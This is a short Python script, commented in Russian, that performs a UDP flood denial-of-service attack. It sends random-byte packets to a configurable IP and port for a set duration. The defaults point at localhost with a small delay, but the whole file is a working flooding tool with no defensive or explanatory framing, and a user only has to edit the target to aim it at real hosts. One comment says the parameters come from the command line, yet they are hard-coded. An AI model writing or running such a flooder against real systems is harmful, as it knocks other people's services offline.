import socket
import random
import time
import sys


def udp_flood(target_ip, target_port, duration, packet_size):
    # Создаем UDP-сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Время окончания флуд-атаки
    end_time = time.time() + duration
    packet_count = 0

    print(f"Начинаю UDP-флуд на {target_ip}:{target_port} в течение {duration} секунд...")

    try:
        while time.time() < end_time:
            # Генерируем случайные данные для пакета
            packet = random._urandom(packet_size)

            # Отправляем пакет
            sock.sendto(packet, (target_ip, target_port))
            packet_count += 1

            # Небольшая задержка, чтобы не перегружать локальную сеть
            time.sleep(0.001)

    except KeyboardInterrupt:
        print("\nФлуд остановлен пользователем.")
    except Exception as e:
        print(f"Произошла ошибка: {e}")
    finally:
        sock.close()
        print(f"Отправлено {packet_count} пакетов.")


if __name__ == "__main__":
    # Получаем параметры из командной строки
    target_ip = "127.0.0.1"
    target_port = 80
    duration = 10  # Время в секундах
    packet_size = 10  # Размер пакета в байтах

    udp_flood(target_ip, target_port, duration, packet_size)